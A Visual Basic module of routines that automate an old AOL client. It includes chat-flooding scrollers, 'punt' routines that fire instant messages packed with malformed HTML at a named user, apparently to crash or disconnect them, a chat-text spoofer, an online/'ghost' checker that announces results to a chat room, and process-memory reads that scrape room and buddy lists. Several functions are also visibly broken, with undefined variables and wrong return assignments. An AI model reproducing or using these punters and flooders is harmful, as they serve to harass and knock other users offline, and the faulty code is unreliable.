AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥ ß¥ (¥)ï§†ê®}{8ë®" & Chr(4) & "/-=!=-\"
End Sub

Sub IM_FastIM(who As String, messa As String)
Call XAOL4_Keyword("aol://9293:")
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMS% = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(IMS%, "_AOL_Edit")
aolrich% = FindChildByClass(IMS%, "RICHCNTL")
IMsend2% = FindChildByClass(IMS%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop
Call AOLSetText(AOLEdit%, who)
Call AOLSetText(aolrich%, messa)
IMsend2% = FindChildByClass(IMS%, "_AOL_Icon")
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, GW_HWNDNEXT)
Next sends
AOLIcon (IMsend2%)
Call killwin(IMS%)
End Sub
Function Onlinecheck(person As String)
Dim intmessageresult As Integer
Dim blnisdirty As String
blnisdirty = True
person$ = UCase(person)
AOL% = FindWindow("AOL Frame25", "America  Online")
Call AOLRunMenuByString("Send an Instant Message")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(IMWin, "_AOL_Edit")
aolrich% = FindChildByClass(IMWin, "RICHCNTL")
IMsend2% = FindChildByClass(IMWin, "_AOL_Icon")
Msg% = FindWindow("#32770", "America Online")

If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop

Call AOLSetText(AOLEdit%, person)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
clik:
AOLIcon (IMsend2%)
Msg% = FindWindow("#32770", "America Online")
If Msg% = 0 Then GoTo clik:
stc = FindChildByClass(Msg%, "_AOL_Static")
X = GetText(Msg%)
If InStr(1, X, "currently") Then Z = person & " is not available" 'put what to say here if they are offline
If InStr(1, X, "able") Then Z = person & " has IM's on"    'Put what to say in here for IMs on
If InStr(1, X, "cannot") Then Z = person & " has IM's off" 'Put what to say here for IMs off
Onlinecheck = Z
If Z = person & " is not available" Then
Pause (1)
waitforok
waitforok
intmessageresult = MsgBox(LCase$(person) & " is not signed on or ghostin." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(person) & " • is not signed on or ghostin •"
End If
Else
End If
If Z = person & " has IM's off" Then
Pause (1)
waitforok
waitforok
intmessageresult = MsgBox(LCase$(person) & " has their IMz off." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(person) & " • has their IMz off •"
End If
Else
End If
If Z = person & " has IM's on" Then
Pause (1)
waitforok
waitforok
intmessageresult = MsgBox(LCase$(person) & " has their IMz on." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(person) & " • has their IMz on •"
End If
Else
End If
S = SendMessageByNum(Msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(Msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(Msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(IMWin, WM_CLOSE, 0, 0)
End Function

Function LinkSender(Txt As String, URL As String)
Hyperlink = ("<A HREF=" & Chr$(34) & text2 & Chr$(34) & ">" & Text1 & "</A>")
End Function
Sub AOLCatWatch()
Do
    Y% = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo lol
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
W = InStr(LCase$(namez$), LCase$("catwatch"))
X = InStr(LCase$(namez$), LCase$("catid"))
If W <> 0 Then
Call XAOL4_Keyword("PC")
MsgBox "A Cat had entered the room."
End If
If X <> 0 Then
Call XAOL4_Keyword("PC")
MsgBox "A Cat had entered the room."
End If
Next Index%
lol:
Loop
End Sub
Sub AOLChangeWavDirect(wav As String)
'change the directory of the wav's
'AOLChangeWavDirect("C:\aol30\download")
Open "C:\AOL25\tool\chat.aol" For Binary As #1
Seek #1, 6935
Put #1, , wav
Close #1
End Sub

Public Sub AOLPuntExtreme(person$)
Call AOLInstantMessage(person$, "<a hreh><a href></a>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(person$, "</a>")
End Sub
Public Sub AOLPuntCombo(person$)
Call AOLInstantMessage(person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
End Sub
Sub AOLInstantMessage(person, Message)
Call Keyword("aol://9293:")
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop
Call AOLSetText(AOLEdit%, person)
Call AOLSetText(aolrich%, Message)
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, GW_HWNDNEXT)
Next sends
AOLIcon (IMsend2%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(im%, WM_CLOSE, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
End Sub
Sub AOLInstantMessage2(person)
Call Keyword("aol://9293:")
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, ">Instant Message From: ")
AOLEdit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
If AOLEdit% <> 0 Then Exit Do
Loop
Call AOLSetText(AOLEdit%, person)
Pause (0.6)
ClickIcon (IMsend2%)
End Sub
Sub AOLInstantMessage3(person, Message)
Call Keyword("aol://9293:")
Call Keyword("aol://9293:")
Call Keyword("aol://9293:")
Call Keyword("aol://9293:")
Call Keyword("aol://9293:")
Do
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop
Call AOLSetText(AOLEdit%, person)
Call AOLSetText(aolrich%, Message)
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, 2)
Next sends
AOLIcon (IMsend2%)
Loop Until im% = 0
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(im%, WM_CLOSE, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop

End Sub
Sub AOLInstantMessage4(person, Message)
Call Keyword("aol://9293:")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop
Call AOLSetText(AOLEdit%, person)
Call AOLSetText(aolrich%, Message)
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, 2)
Next sends
AOLIcon (IMsend2%)
End Sub



Function AOLChangeIMCaption(Txt As String)
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
IMText2% = FindChildByClass(im%, "_AOL_Static")
Call AOLSetText(IMText2%, Txt)
End Function
Function Juno_Activate()
X = GetCaption(JunoWindow)
AppActivate X
End Function
Function Juno_Tab()
JunoTab = FindChildByClass(JunoWindow, "#32770")
End Function
Function Juno_Window()
jun% = FindWindow("Afx:b:152e:6:386f", vbNullString)
JunoWindow = jun%
End Function
Function ReadFile(Where As String)
Filenum = FreeFile
Open (Where) For Input As Filenum
Info = Input(LOF(Filenum), Filenum)
Info = ReadFile
End Function
Sub XAOL4_15Liner(Txt As TextBox)
'Max of 14 chr or else u get Msg is too long
Call XAOL4_SetFocus
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.8
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.8
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.8
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.8
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.3
XAOL4_ChatSend "" + Txt.text + "" & c$ & "" + Txt.text + ""
Pause 0.8
End Sub
Public Sub XAOL4_AddRoom(Listboxes As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = XAOL4_FindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6
person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)
person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Listboxes.AddItem person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Sub XAOL4_BuddyVIEW()
Call XAOL4_Keyword("Buddy View")
End Sub
Sub XAOL4_BudList(Lst As ListBox)
'This adds the AOL Buddy List to a VB listbox
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = FindChildByTitle(AOLMDI(), "Buddy List Window")
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6
person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)
person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Lst.AddItem person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Sub XAOL4_ChangeCaption(newcaption As String)
Call AOLSetText(AOLWindow(), newcaption)
End Sub
Sub XAOL4_ChatManipulator(who$, what$)
'This makes the chat room text near the VERY TOP
'what u want
view% = FindChildByClass(XAOL4_FindRoom(), "RICHCNTL")
Buffy$ = Chr$(13) & Chr$(10) & "" & (who$) & ":" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub XAOL4_ChatSend(Txt)
    room% = XAOL4_FindRoom()
    If room% Then
        hChatEdit% = FindChildByClass(room%, "RICHCNTL")
        ret = SendMessageByString(hChatEdit%, WM_SETTEXT, 0, Txt)
        ret = SendMessageByNum(hChatEdit%, WM_CHAR, 13, 0)
    End If
End Sub
Sub XAOL4_ClearChat()
childs% = XAOL4_FindRoom()
child = FindChildByClass(childs%, "RICHCNTL")
GetTrim = SendMessageByNum(child, 13, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 12, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
End Sub
Function XAOL4_CountMail()
themail% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Online Mailbox")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Function XAOL4_FindRoom()
'Finds the chat room and sets focus on it
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDIClient")
    firs% = GetWindow(MDI%, 5)
    listers% = FindChildByClass(firs%, "RICHCNTL")
    Listere% = FindChildByClass(firs%, "RICHCNTL")
    Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or Listere% = 0 Or Listerb% = 0) And (l <> 100)
            DoEvents
            firs% = GetWindow(firs%, 2)
            listers% = FindChildByClass(firs%, "RICHCNTL")
            Listere% = FindChildByClass(firs%, "RICHCNTL")
            Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
            If listers% And Listere% And Listerb% Then Exit Do
            l = l + 1
    Loop
    If (l < 100) Then
        AOL4_FindRoom = firs%
        Exit Function
    End If
    

End Function
Function XAOL4_GetChat()
'This gets all the txt from chat room
childs% = XAOL4_FindRoom()
child = FindChildByClass(childs%, "_AOL_View")
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
AOL4_GetChat = theview$
End Function
Public Sub XAOL4_GetCurrentRoomName()
X = GetCaption(XAOL4_FindRoom())
MsgBox X
End Sub
Function XAOL4_GetUser()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOL4_GetUser = User
End Function
Sub XAOL4_Hide()
A = ShowWindow(AOLWindow(), SW_HIDE)
End Sub
Sub XAOL4_IMOff()
Call XAOL4_InstantMessage("$IM_OFF", "   (\/\_/¯\_)¯\£ÃßÝRÍÑ†H/¯(_/¯\_/\/)")
End Sub
Sub XAOL4_IMOn()
Call XAOL4_InstantMessage("$IM_ON", "   (\/\_/¯\_)¯\£ÃßÝRÍÑ†H/¯(_/¯\_/\/)")
End Sub
Sub XAOL4_InstantMessage(person, Message)
Call XAOL4_Keyword("aol://9293:" & person)
Pause (2)
Do
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
Loop Until (im% <> 0 And aolrich% <> 0 And IMsend2% <> 0)
Call SendMessageByString(aolrich%, WM_SETTEXT, 0, Message)
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, GW_HWNDNEXT)
Next sends
AOLIcon IMsend2%
If im% Then Call AOLKillWindow(im%)
End Sub
Sub XAOL4_LocateMember(name As String)
Call XAOL4_Keyword("aol://3548:" + name)
End Sub
